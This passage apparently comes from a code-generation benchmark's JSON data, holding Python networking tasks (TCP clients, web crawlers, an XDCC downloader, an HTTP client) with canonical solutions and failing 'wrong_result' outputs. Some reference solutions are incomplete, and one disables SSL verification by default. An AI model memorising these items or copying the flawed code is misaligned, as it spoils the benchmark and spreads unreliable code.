pool_stat.replace('.', '_')\n                        pools[pool_name][server_name] = {}\n                        for server_stat, server_value in pool_value.iteritems():\n                            pools[pool_name][server_name][server_stat] = int(server_value)\n                    else:\n                        pools[pool_name][pool_stat] = int(pool_value)\n            else:\n                if stat not in self.IGNORED:\n                    stats[stat] = int(value)\n\n        return stats, pools\n\n    def collect_stats(self, hosts):\n        if isinstance(hosts, basestring):\n            hosts = [hosts]\n\n        results = {}\n        for host in hosts:\n            matches = re.search('((.+)\\@)?([^:]+)(:(\\d+))?', host)\n            alias = matches.group(2) or matches.group(3)\n            hostname = matches.group(3)\n            port = matches.group(5)\n\n            stats, pools = self.get_stats(hostname, port)\n            results[alias] = {\n                'stats': stats,\n                'pools': pools\n            }\n\n        return results",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\nclass TwemproxyStatsCollector:\n    GAUGES = ['connections', 'current_connections', 'total_connections']\n    IGNORED = ['version', 'uptime']\n\n    def get_raw_stats(self, host, port):\n        with socket.create_connection((host, port)) as sock:\n            sock.sendall(b'stats\\n')\n            response = b''\n            while True:\n                data = sock.recv(4096)\n                if not data:\n                    break\n                response += data\n        lines = response.decode().splitlines()\n        stats = {}\n        for line in lines:\n            if line.startswith('STAT'):\n                parts = line.split()\n                key = parts[1]\n                value = ' '.join(parts[2:])\n                stats[key] = value\n        return stats\n\n    def get_stats(self, host, port):\n        raw_stats = self.get_raw_stats(host, port)\n        general_stats = {}\n        pool_stats = {}\n        for key in raw_stats:\n            if key in self.IGNORED:\n                continue\n            if key in self.GAUGES:\n                general_stats[key] = float(raw_stats[key])\n            else:\n                if key.startswith('pool:'):\n                    pool_stats[key] = float(raw_stats[key])\n                else:\n                    general_stats[key] = float(raw_stats[key])\n        return (general_stats, pool_stats)\n\n    def collect_stats(self, hosts):\n        result = {}\n        for alias, host, port in hosts:\n            general, pool = self.get_stats(host, port)\n            result[alias] = {\n                'general': general,\n                'pool': pool\n            }\n        return result"
  },
  {
    "Task_id": 34,
    "Instruction": "Task Description: Create a function to crawl content from Weixin Official Account Platform (mp.weixin.qq.com) URLs using HTTP requests with proper error handling and logging.\n\nFunction Description: The function mp_crawler takes a URL and a logger object as input, validates the URL, makes an HTTPS request to the Weixin Official Account Platform, and returns a status code along with response data (empty in case of errors). It includes URL validation, HTTP request handling with timeout, and proper error logging.\n\nInput:\n- url: str - The target URL to crawl (must be from mp.weixin.qq.com domain)\n- logger: logging.Logger - Logger object for recording warnings and errors\n\nOutput:\n- Tuple[int, dict] - Returns a tuple containing:\n  - First element: int status code (-5 for invalid URL, -7 for request failure, or HTTP status code for success)\n  - Second element: dict containing response data (empty dict in case of errors)",
    "Canonical_solution": "import httpx\nfrom bs4 import BeautifulSoup\nfrom datetime import datetime\nimport re\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/604.1 Edg/112.0.100.0'}\n\ndef mp_crawler(url: str, logger) -> (int, dict):\n    if not url.startswith('https://mp.weixin.qq.com') and not url.startswith('http://mp.weixin.qq.com'):\n        logger.warning(f'{url} is not a mp url, you should not use this function')\n        return -5, {}\n\n    url = url.replace(\"http://\", \"https://\", 1)\n\n    try:\n        with httpx.Client() as client:\n            response = client.get(url, headers=header, timeout=30)\n    except Exception as e:\n        logger.warning(f\"cannot get content from {url}\\n{e}\")\n        return -7, {}",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "import requests\nimport logging\nimport re\n\ndef mp_crawler(url, logger):\n    if not re.fullmatch(r'^https://mp\\.weixin\\.qq\\.com/.*$', url):\n        logger.warning(f\"Invalid URL: {url}\")\n        return (-5, {})\n    \n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n    except requests.exceptions.RequestException as e:\n        logger.error(f\"Request failed: {e}\")\n        return (-7, {})\n    \n    try:\n        data = response.json()\n    except ValueError:\n        logger.warning(\"Failed to parse JSON response\")\n        data = {}\n    \n    return (response.status_code, data)"
  },
  {
    "Task_id": 342,
    "Instruction": "Task Description: Create a Python function that establishes a TCP client connection to a server, sends a message, and continuously receives responses from the server.\n\nFunction Description: The function `tcp_client_communication` creates a TCP socket, connects to a specified server, sends a predefined or custom message, and enters a loop to continuously receive and print responses from the server until manually interrupted. The connection is closed after the loop exits (though in practice, the loop is infinite and `s.close()` may not be reached).\n\nInput:\n- `host` (str, optional): The IP address or hostname of the target server. Defaults to \"localhost\".\n- `port` (int, optional): The port number of the target server. Defaults to 5001.\n- `message` (bytes, optional): The message to send to the server. Defaults to a predefined GPS tracker message in bytes format.\n\nOutput: None (The function prints received data to the console but does not return any value).",
    "Canonical_solution": "import socket\nimport binascii\n\ndef tcp_client_communication(host=\"localhost\", port=5001, message=b\"imei:123456789012345,tracker,151030080103,,F,000101.000,A,5443.3834,N,02512.9071,E,0.00,0;\"):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    s.send(message)\n    \n    while True:\n        print(s.recv(1024))\n    \n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\ndef tcp_client_communication(host=\"localhost\", port=5001, message=b'GPS_TRACKER_MESSAGE'):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        try:\n            sock.connect((host, port))\n            sock.sendall(message)\n            while True:\n                data = sock.recv(1024)\n                if not data:\n                    break\n                print(data.decode())\n        except KeyboardInterrupt:\n            print(\"Client interrupted. Closing connection.\")"
  },
  {
    "Task_id": 344,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a specified server, sends a payload consisting of a command and optional padding, and then closes the connection.\n\nFunction Description: The function `send_tcp_payload` creates a TCP socket, connects to a target server using the provided IP address and port, sends a payload formed by combining a command string with optional padding, and finally closes the socket connection. This is useful for simple TCP-based client-server communication scenarios.\n\nInput:\n- `ipaddr`: [str] - The IP address of the target server to connect to\n- `port`: [int] - The port number on the target server to connect to\n- `cmd`: [str] - The command string to be sent as part of the payload\n- `padding`: [str] - Optional additional data to be appended to the command\n\nOutput: None (The function performs an action but doesn't return any value)",
    "Canonical_solution": "import socket\n\ndef send_tcp_payload(ipaddr, port, cmd, padding):\n    payload = cmd + padding\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ipaddr, port))\n    s.send(payload.encode())\n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\ndef send_tcp_payload(ipaddr, port, cmd, padding=''):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((ipaddr, port))\n        payload = cmd + padding\n        sock.sendall(payload.encode())"
  },
  {
    "Task_id": 346,
    "Instruction": "Task Description: Implement a TCP client class for handling XDCC file downloads with progress tracking, speed calculation, and resumable download capabilities.\n\nClass Description: XDCCRequest is a class that manages file downloads over DCC (Direct Client-to-Client) protocol using TCP sockets. It provides functionality for establishing connections, downloading files with progress tracking, handling resumable downloads, and managing download speed calculations.\n\nAttributes:\n- proxies: dict - Proxy configuration for the connection\n- bucket: object - Rate limiting bucket for download speed control\n- fh: file object - File handle for writing downloaded data\n- dccsock: socket - TCP socket for DCC connection\n- filesize: int - Total size of the file being downloaded\n- received: int - Number of bytes received so far\n- speeds: list - List of recent download speeds (last three measurements)\n- sleep: float - Dynamic sleep interval for rate control\n- last_recv_size: int - Size of last received data chunk\n- send_64bits_ack: bool - Flag for using 64-bit ACK packets\n- abort: bool - Flag to indicate download abortion\n- status_notify: function - Callback for progress updates\n\nMethods:\n- create_socket() -> socket - Creates and returns a new TCP socket\n- _write_func(buf: bytes) -> None - Writes buffer to file with rate control\n- _send_ack() -> None - Sends acknowledgement of received bytes to server\n- download(ip: str, port: int, filename: str, status_notify: function=None, resume: function=None) -> str - Main download method\n- abort_downloads() -> None - Sets abort flag to stop current download\n- update_progress() -> None - Triggers progress notification callback\n- close() -> None - Cleanup method (currently empty)\n\nProperties:\n- size: int - Returns total file size\n- arrived: int - Returns bytes received so far\n- speed: int - Returns average download speed\n- percent: int - Returns download progress percentage",
    "Canonical_solution": "import errno\nimport os\nimport select\nimport socket\nimport struct\nimport time\n\nclass XDCCRequest:\n    def __init__(self, bucket=None, options={}):\n        self.proxies = options.get(\"proxies\", {})\n        self.bucket = bucket\n        self.fh = None\n        self.dccsock = None\n        self.filesize = 0\n        self.received = 0\n        self.speeds = [0, 0, 0]\n        self.sleep = 0.000\n        self.last_recv_size = 0\n        self.send_64bits_ack = False\n        self.abort = False\n        self.status_notify = None\n\n    def create_socket(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        return sock\n\n    def _write_func(self, buf):\n        size = len(buf)\n        self.received += size\n        self.fh.write(buf)\n\n        if self.bucket:\n            time.sleep(self.bucket.consumed(size))\n        else:\n            if size < self.last_recv_size:\n                self.sleep += 0.002\n            else:\n                self.sleep *= 0.7\n            self.last_recv_size = size\n            time.sleep(self.sleep)\n\n    def _send_ack(self):\n        try:\n            self.dccsock.send(\n                struct.pack(\"!Q\" if self.send_64bits_ack else \"!I\", self.received)\n            )\n        except socket.error:\n            pass\n\n    def download(self, ip, port, filename, status_notify=None, resume=None):\n        self.status_notify = status_notify\n        self.send_64bits_ack = not self.filesize < 1 << 32\n        chunk_name = filename + \".chunk0\"\n\n        if resume and os.path.exists(chunk_name):\n            self.fh = open(chunk_name, mode=\"ab\")\n            resume_position = self.fh.tell()\n            if not resume_position:\n                resume_position = os.stat(chunk_name).st_size\n            resume_position = resume(resume_position)\n            self.fh.truncate(resume_position)\n            self.received = resume_position\n        else:\n            self.fh = open(chunk_name, mode=\"wb\")\n\n        last_update = time.time()\n        num_recv_len = 0\n        self.dccsock = self.create_socket()\n        recv_list = [self.dccsock]\n        self.dccsock.connect((ip, port))\n        self.dccsock.setblocking(False)\n\n        while True:\n            if self.abort:\n                self.dccsock.close()\n                self.fh.close()\n                raise Abort\n\n            fdset = select.select(recv_list, [], [], 0.1)\n            if self.dccsock in fdset[0]:\n                try:\n                    data = self.dccsock.recv(16384)\n                except socket.error as exc:\n                    if exc.errno in (errno.EAGAIN, errno.EWOULDBLOCK):\n                        continue\n                    else:\n                        raise\n\n                data_len = len(data)\n                if data_len == 0 or self.received + data_len > self.filesize > 0:\n                    break\n\n                num_recv_len += data_len\n                self._write_func(data)\n                self._send_ack()\n\n            now = time.time()\n            timespan = now - last_update\n            if timespan > 1:\n                self.speeds[2] = self.speeds[1]\n                self.speeds[1] = self.speeds[0]\n                self.speeds[0] = num_recv_len // timespan\n                num_recv_len = 0\n                last_update = now\n                self.update_progress()\n\n        self.dccsock.close()\n        self.fh.close()\n        os.rename(chunk_name, filename)\n        return filename\n\n    def abort_downloads(self):\n        self.abort = True\n\n    def update_progress(self):\n        if self.status_notify:\n            self.status_notify({\"progress\": self.percent})\n\n    @property\n    def size(self):\n        return self.filesize\n\n    @property\n    def arrived(self):\n        return self.received\n\n    @property\n    def speed(self):\n        speeds = [x for x in self.speeds if x]\n        return sum(speeds) // len(speeds)\n\n    @property\n    def percent(self):\n        if not self.filesize:\n            return 0\n        return (self.received * 100) // self.filesize\n\n    def close(self):\n        pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "class XDCCRequest:\n    def __init__(self, proxies=None, bucket=None, fh=None):\n        self.proxies = proxies or {}\n        self.bucket = bucket\n        self.fh = fh\n        self.dccsock = None\n        self.filesize = 0\n        self.received = 0\n        self.speeds = []\n        self.sleep = 0.0\n        self.last_recv_size = 0\n        self.send_64bits_ack = False\n        self.abort = False\n        self.status_notify = None\n\n    def create_socket(self):\n        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def _write_func(self, buf):\n        while self.bucket and self.bucket.get_token():\n            self.sleep = self.bucket.get_token()\n            if self.sleep > 0:\n                time.sleep(self.sleep)\n        self.fh.write(buf)\n        self.received += len(buf)\n        self.speeds.append(self._calculate_speed())\n        if len(self.speeds) > 3:\n            self.speeds.pop(0)\n        self.update_progress()\n\n    def _calculate_speed(self):\n        return sum(self.speeds) // len(self.speeds) if self.speeds else 0\n\n    def _send_ack(self):\n        ack_bytes = self.received.to_bytes(8, 'big') if self.send_64bits_ack else self.received.to_bytes(4, 'big')\n        self.dccsock.sendall(ack_bytes)\n\n    def download(self, ip, port, filename, status_notify=None, resume=None):\n        self.status_notify = status_notify\n        self.filesize = os.path.getsize(filename) if resume else 0\n        self.received = 0\n        self.dccsock = self.create_socket()\n        try:\n            self.dccsock.connect((ip, port))\n            self.dccsock.sendall(filename.encode())\n            if resume:\n                self.received = resume()\n            while not self.abort and self.received < self.filesize:\n                data = self.dccsock.recv(1024)\n                if not data:\n                    break\n                self._write_func(data)\n                self._send_ack()\n        except Exception as e:\n            print(f\"Download error: {e}\")\n        finally:\n            self.close()\n\n    def abort_downloads(self):\n        self.abort = True\n\n    def update_progress(self):\n        if self.status_notify:\n            self.status_notify(self.received, self.filesize)\n\n    def close(self):\n        if self.dccsock:\n            self.dccsock.close()\n        if self.fh:\n            self.fh.close()\n\n    @property\n    def size(self):\n        return self.filesize\n\n    @property\n    def arrived(self):\n        return self.received\n\n    @property\n    def speed(self):\n        return self._calculate_speed()\n\n    @property\n    def percent(self):\n        return int((self.received / self.filesize) * 100) if self.filesize else 0"
  },
  {
    "Task_id": 349,
    "Instruction": "Task Description: Create a Python class that provides TCP socket functionality including connection establishment, data transmission, and SSL support for secure communication.\n\nClass Description: The SocketLibrary class encapsulates TCP socket operations with support for both regular and SSL-wrapped connections. It provides methods to establish connections, send/receive data, and gather connection information.\n\nAttributes: None (This is a utility class without persistent attributes)\n\nMethods:\n\nMethod1: create_tcp_socket(host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]] - Creates and returns a TCP socket connection to the specified host and port. Attempts SSL connection first, falls back to regular TCP if SSL fails. Returns a tuple containing the socket object and SSL flag (True if SSL succeeded).\n\nMethod2: tcp_connect_only(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]] - Establishes a TCP connection to verify connectivity and returns connection details including peer information, service name, and SSL status without data transmission.\n\nMethod3: tcp_connect_send_and_receive(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]] - Establishes a TCP connection, sends test data, receives response, and returns connection details including peer information, service name, response data, and SSL status.",
    "Canonical_solution": "import socket\nimport ssl\nfrom typing import Optional, Tuple, Dict, Any\n\nclass SocketLibrary:\n    def create_tcp_socket(self, host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]]:\n        try:\n            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            socket_connection.settimeout(timeout)\n            socket_connection.connect((host, port))\n            ssl_flag = False\n        except ConnectionRefusedError:\n            return None\n\n        try:\n            socket_connection = ssl.wrap_socket(socket_connection)\n            ssl_flag = True\n        except Exception:\n            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            socket_connection.settimeout(timeout)\n            socket_connection.connect((host, port))\n\n        return socket_connection, ssl_flag\n\n    def tcp_connect_only(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        tcp_socket = self.create_tcp_socket(host, port, timeout)\n        if tcp_socket is None:\n            return None\n\n        socket_connection, ssl_flag = tcp_socket\n        peer_name = socket_connection.getpeername()\n        socket_connection.close()\n        return {\n            \"peer_name\": peer_name,\n            \"service\": socket.getservbyport(int(port)),\n            \"ssl_flag\": ssl_flag,\n        }\n\n    def tcp_connect_send_and_receive(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        tcp_socket = self.create_tcp_socket(host, port, timeout)\n        if tcp_socket is None:\n            return None\n\n        socket_connection, ssl_flag = tcp_socket\n        peer_name = socket_connection.getpeername()\n        try:\n            socket_connection.send(b\"ABC\\x00\\r\\n\\r\\n\\r\\n\" * 10)\n            response = socket_connection.recv(1024 * 1024 * 10)\n            socket_connection.close()\n        except Exception:\n            try:\n                socket_connection.close()\n                response = b\"\"\n            except Exception:\n                response = b\"\"\n        return {\n            \"peer_name\": peer_name,\n            \"service\": socket.getservbyport(port),\n            \"response\": response.decode(errors=\"ignore\"),\n            \"ssl_flag\": ssl_flag,\n        }",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport ssl\n\nclass SocketLibrary:\n    def create_tcp_socket(self, host: str, port: int, timeout: float) -> tuple[socket.socket, bool] | None:\n        try:\n            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(timeout)\n            ssl_sock = context.wrap_socket(sock, server_hostname=host)\n            ssl_sock.connect((host, port))\n            return (ssl_sock, True)\n        except (ssl.SSLError, socket.error) as e:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(timeout)\n            sock.connect((host, port))\n            return (sock, False)\n        except Exception as e:\n            return None\n\n    def tcp_connect_only(self, host: str, port: int, timeout: float) -> dict[str, any] | None:\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(timeout)\n            sock.connect((host, port))\n            peer_info = sock.getpeername()\n            service_name = socket.getservbyport(port)\n            return {'peer': peer_info, 'service': service_name, 'ssl': False}\n        except socket.error as e:\n            return None\n\n    def tcp_connect_send_and_receive(self, host: str, port: int, timeout: float) -> dict[str, any] | None:\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(timeout)\n            sock.connect((host, port))\n            peer_info = sock.getpeername()\n            service_name = socket.getservbyport(port)\n            test_data = b\"Hello, world!\"\n            sock.sendall(test_data)\n            response = sock.recv(1024)\n            return {'peer': peer_info, 'service': service_name, 'response': response.decode('utf-8'), 'ssl': False}\n        except socket.error as e:\n            return None"
  },
  {
    "Task_id": 35,
    "Instruction": "Task Description: Create a Python class that provides HTTP client functionality using both the `httpx` and `requests` libraries, with support for common HTTP methods, SSL verification control, and custom headers.\n\nClass Description: The `HTTPClient` class encapsulates HTTP request functionality, offering methods to perform GET requests and check API/web accessibility. It supports custom headers and SSL verification configuration.\n\nAttributes:\n\nheader: dict - Dictionary containing HTTP headers to be sent with requests (default includes User-Agent)\nverify: bool - Flag indicating whether to verify SSL certificates (default is False)\n\nMethods:\n\ntest_api_web: test_api_web(url: str) -> Optional[Tuple[str, str]] - Checks if a web API/URL is accessible and returns a tuple containing the page title and URL if successful, None otherwise\nget_request: get_request(url: str, params: dict = None) -> requests.Response - Sends a GET request using the requests library and returns the Response object\nclient_get: client_get(url: str) -> httpx.Response - Sends a GET request using httpx client and returns the Response object",
    "Canonical_solution": "import httpx\nimport requests\nfrom typing import Optional, Tuple\nfrom loguru import logger\n\nclass HTTPClient:\n    def __init__(self, headers: dict = None, verify_ssl: bool = False):\n        self.header = headers or {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36\"\n        }\n        self.verify = verify_ssl\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        \"\"\"Check if API web is accessible\n        :return: Tuple containing (title, url) if successful, None otherwise\n        \"\"\"\n        if url is None:\n            return None\n            \n        with httpx.Client(headers=self.header, verify=self.verify) as client:\n            try:\n                resp = client.get(url=url).text\n                title = re.findall('<title>(.*?)</title>', resp)\n                if title:\n                    logger.info(f\"{url} title:{title[0]}\")\n                    return (title[0], url)\n            except httpx.HTTPError as why:\n                logger.error(f\"{url} request error! {why}\")\n        return None\n\n    def get_request(self, url: str, params: dict = None) -> requests.Response:\n        \"\"\"Send GET request using requests library\n        :return: Response object\n        \"\"\"\n        try:\n            return requests.get(\n                url,\n                headers=self.header,\n                params=params,\n                timeout=8,\n                verify=self.verify\n            )\n        except Exception as e:\n            logger.error(f\"GET request failed: {e}\")\n            raise\n\n    def client_get(self, url: str) -> httpx.Response:\n        \"\"\"Send GET request using httpx client\n        :return: Response object\n        \"\"\"\n        with httpx.Client(verify=self.verify) as client:\n            return client.get(url, headers=self.header)",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "import requests\nimport httpx\nfrom typing import Optional, Tuple\n\nclass HTTPClient:\n    def __init__(self):\n        self.header = {'User-Agent': 'MyApp/1.0'}\n        self.verify = False\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        response = self.get_request(url)\n        if response.status_code == 200:\n            start = response.text.find('<title>')\n            if start == -1:\n                return None\n            end = response.text.find('</title>', start)\n            if end == -1:\n                return None\n            title = response.text[start+7:end].strip()\n            return (title, url)\n        return None\n\n    def get_request(self, url: str, params: dict = None) -> requests.Response:\n        return requests.get(url, headers=self.header, params=params, verify=self.verify)\n\n    def client_get(self, url: str) -> httpx.Response:\n        return httpx.get(url, headers=self.header, verify=self.verify)"
  },
  {
    "Task_id": 356,
    "Instruction": "Task Description: Implement a TCP client class that communicates with a server to validate sessions using JSON-RPC protocol, handling connection management, data transmission, and response validation.\n\nClass Description: CaseTCP is a TCP client class that establishes and maintains a connection to a server, sends session validation requests in JSON-RPC format, and processes the server's responses with proper error handling and assertion checks.\n\nAttributes:\n- identity: int - A unique identifier for the client (defaults to process ID)\n- expected: bool - The expected validation result from the server\n- uri: str - The server IP address (default: '127.0.0.1')\n- port: int - The server port number (default: 8545)\n- sock: socket.socket - The TCP socket object for communication\n- payload: str - A random string payload for session validation\n\nMethods:\n- __init__(uri: str = '127.0.0.1', port: int = 8545, identity: int = os.getpid()) -> None - Initializes the client with server connection details and generates a random payload\n- __call__(**kwargs) -> int - Makes a combined send and receive call (takes optional a and b parameters)\n- send(*, a: Optional[int] = None, b: Optional[int] = None) -> int - Sends a session validation request to the server with optional parameters (generates random values if not provided)\n- recv() -> int - Receives and validates the server response, returning the validation result",
    "Canonical_solution": "import os\nimport json\nimport errno\nimport socket\nfrom typing import Optional\n\ndef make_tcp_socket(ip: str, port: int):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    return sock\n\ndef socket_is_closed(sock: socket.socket) -> bool:\n    if sock is None:\n        return True\n    try:\n        buf = sock.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT)\n        if buf == b'':\n            return True\n    except BlockingIOError as exc:\n        if exc.errno != errno.EAGAIN:\n            raise\n    return False\n\ndef recvall(sock, buffer_size=4096):\n    data = b\"\"\n    while True:\n        chunk = sock.recv(buffer_size)\n        if not chunk:\n            break\n        data += chunk\n    return data\n\nclass CaseTCP:\n    def __init__(self, uri: str = '127.0.0.1', port: int = 8545, identity: int = os.getpid()) -> None:\n        self.identity = identity\n        self.expected = -1\n        self.uri = uri\n        self.port = port\n        self.sock = None\n        self.payload = ''.join(random.choices(string.ascii_uppercase, k=80))\n\n    def __call__(self, **kwargs) -> int:\n        self.send(**kwargs)\n        return self.recv()\n\n    def send(self, *, a: Optional[int] = None, b: Optional[int] = None) -> int:\n        a = random.randint(1, 1000) if a is None else a\n        b = random.randint(1, 1000) if b is None else b\n        jsonrpc = '{\"jsonrpc\":\"2.0\",\"id\":%i,\"method\":\"validate_session\",\"params\":{\"user_id\":%i,\"session_id\":%i,\"text\":\"%s\"}}' % (self.identity, a, b, self.payload)\n        self.expected = (a ^ b) % 23 == 0\n        self.sock = make_tcp_socket(self.uri, self.port) if socket_is_closed(self.sock) else self.sock\n        self.sock.send(jsonrpc.encode())\n\n    def recv(self) -> int:\n        response_bytes = recvall(self.sock).decode()\n        self.sock.settimeout(None)\n        response = json.loads(response_bytes)\n        assert 'error' not in response, response['error']\n        received = response['result']\n        assert response['jsonrpc']\n        assert response.get('id', None) == self.identity\n        assert self.expected == received, 'Wrong Answer'\n        return received",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport json\nimport os\nimport random\nfrom typing import Optional\n\nclass CaseTCP:\n    def __init__(self, uri: str = '127.0.0.1', port: int = 8545, identity: int = os.getpid()):\n        self.identity = identity\n        self.expected = False\n        self.uri = uri\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.connect()\n        self.payload = self.generate_payload()\n\n    def generate_payload(self):\n        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))\n\n    def connect(self):\n        self.sock.connect((self.uri, self.port))\n\n    def __call__(self, **kwargs):\n        result = self.send(**kwargs)\n        return self.recv()\n\n    def send(self, *, a: Optional[int] = None, b: Optional[int] = None) -> int:\n        if a is None:\n            a = random.randint(1, 1000)\n        if b is None:\n            b = random.randint(1, 1000)\n        params = {\n            \"identity\": self.identity,\n            \"payload\": self.payload,\n            \"a\": a,\n            \"b\": b\n        }\n        json_rpc = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": \"session.validate\",\n            \"params\": params,\n            \"id\": self.identity\n        }\n        self.sock.sendall(json.dumps(json_rpc).encode('utf-8'))\n        return a\n\n    def recv(self) -> int:\n        data = self.sock.recv(1024)\n        try:\n            response = json.loads(data)\n        except json.JSONDecodeError:\n            print(\"Invalid JSON response\")\n            return -1\n        if 'error' in response:\n            print(\"Server error:\", response['error'])\n            return -1\n        if response['result'] == self.expected:\n            return 1\n        else:\n            return 0"
  },
  {
    "Task_id": 36,
    "Instruction": "Task Description: Create a Python function that performs HTTP requests using the httpx library to fetch and process content from a given URL, with proper error handling and logging.\n\nFunction Description: The function should make a synchronous HTTP GET request to the specified URL using custom headers, handle potential exceptions, decode the response content using detected encoding, and return the extracted data along with a status code. If the request fails, it should log the error and return an error code with an empty dictionary.\n\nInput:\n- url: str | Path - The target URL to fetch content from\n- logger: logging.Logger - A logger instance for error logging\n\nOutput:\n- Tuple[int, dict] - A tuple containing:\n  - Status code (negative for errors, positive for HTTP status codes)\n  - Dictionary containing extracted data (empty if an error occurs)",
    "Canonical_solution": "import httpx\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/604.1 Edg/112.0.100.0'\n}\n\ndef simple_crawler(url: str | Path, logger) -> (int, dict):\n    try:\n        with httpx.Client() as client:\n            response = client.get(url, headers=header, timeout=30)\n            rawdata = response.content\n            encoding = chardet.detect(rawdata)['encoding']\n            text = rawdata.decode(encoding)\n        result = extractor.extract(text)\n    except Exception as e:\n        logger.warning(f\"cannot get content from {url}\\n{e}\")\n        return -7, {}",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "import httpx\nimport logging\n\ndef fetch_url(url: str, logger: logging.Logger) -> tuple[int, dict]:\n    try:\n        client = httpx.Client()\n        response = client.get(url, headers={\"User-Agent\": \"MyCustomUserAgent\"})\n        if 200 <= response.status_code < 400:\n            data = response.text\n            return (response.status_code, {\"data\": data})\n        else:\n            logger.error(f\"HTTP error {response.status_code} for {url}\")\n            return (-response.status_code, {})\n    except httpx.RequestError as e:\n        logger.error(f\"Request error: {e}\", exc_info=True)\n        return (-1, {})\n    except Exception as e:\n        logger.error(f\"Unexpected error: {e}\", exc_info=True)\n        return (-1, {})"
  },
  {
    "Task_id": 361,
    "Instruction": "Task Description: Create a Python function that sends a TCP payload to a specified target server using socket programming.\n\nFunction Description: The function establishes a TCP connection to a target server using IPv4, constructs an HTTP GET request with the provided payload, sends the request to the server, and then closes the connection. This is useful for testing TCP-based services or sending crafted HTTP requests.\n\nInput:\n- target_ip: [str] - The IP address of the target server to connect to\n- target_port: [int] - The port number on the target server to connect to\n- payload: [str] - The data to be included in the HTTP GET request path\n\nOutput: None (The function performs an action but doesn't return any value)",
    "Canonical_solution": "import socket\n\ndef send_tcp_payload(target_ip, target_port, payload):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, target_port))\n    \n    buf = (\n        \"GET /\" + payload + \" HTTP/1.1\\r\\n\" + \n        \"Host: \" + target_ip + \n        \"\\r\\n\\r\\n\"\n    )\n    \n    s.send(buf)\n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\ndef send_tcp_payload(target_ip, target_port, payload):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((target_ip, target_port))\n        request = f\"GET /{payload} HTTP/1.1\\r\\n\\r\\n\"\n        s.sendall(request.encode())"
  },
  {
    "Task_id": 365,
    "Instruction": "Task Description: Create a Python function that implements a TCP client for basic communication with a server using sockets. The function should establish a connection, send a message, receive a response, and close the connection.\n\nFunction Description: The function `tcp_client_communication` creates a TCP socket, connects to a specified server, sends a message, receives a response, and then closes the connection. It handles IPv4 addresses and uses a stream-oriented connection (TCP).\n\nInput:\n- `host` (str, optional): The IP address or hostname of the server. Defaults to 'localhost'.\n- `port` (int, optional): The port number on which the server is listening. Defaults to 20000.\n- `message` (bytes, optional): The message to send to the server. Defaults to b'Hello\\n'.\n\nOutput:\n- `resp` (bytes): The response received from the server.",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\n\ndef tcp_client_communication(host='localhost', port=20000, message=b'Hello\\n'):\n    s = socket(AF_INET, SOCK_STREAM)\n    s.connect((host, port))\n    s.send(message)\n    resp = s.recv(8192)\n    s.close()\n    return resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
